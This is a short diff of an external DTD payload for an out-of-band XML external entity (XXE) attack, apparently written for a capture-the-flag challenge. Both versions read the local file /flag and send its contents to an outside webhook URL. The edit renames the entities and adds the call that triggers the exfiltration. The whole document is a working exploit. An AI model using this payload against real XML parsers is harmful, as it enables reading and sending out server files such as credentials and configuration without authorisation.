@@ -1,3 +1,4 @@
-<!ENTITY % file SYSTEM "file:///flag">
-<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://elegant-owl-43.webhook.cool/public-test?data=%file;'>">
-%eval;
+<!ENTITY % payload SYSTEM "file:///flag">
+<!ENTITY % param1 "<!ENTITY &#x25; external SYSTEM 'https://elegant-owl-43.webhook.cool/public-test?data=%payload;'>">
+%param1;
+%external;
